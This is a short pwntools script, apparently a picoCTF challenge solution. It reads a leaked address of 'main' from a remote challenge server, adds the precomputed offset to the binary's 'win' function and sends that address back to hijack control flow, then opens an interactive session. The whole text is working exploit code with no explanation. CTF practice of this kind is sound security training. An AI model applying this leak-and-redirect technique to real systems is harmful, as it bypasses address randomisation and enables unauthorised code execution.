from pwn import *
context.log_level = 'debug'

e = ELF('vuln')
val = e.symbols['win'] - e.symbols['main']
log.info(f"val : {hex(val)}")

p = remote('rescued-float.picoctf.net', 60893)
p.recvuntil(b"main: ")
main = int(p.recvline()[:-1], 16)
log.info(f"leaked main: {hex(main)}")

sol = hex(main+val)
log.info(f"sol: {sol}")
p.sendline(hex(main + val).encode())
p.interactive()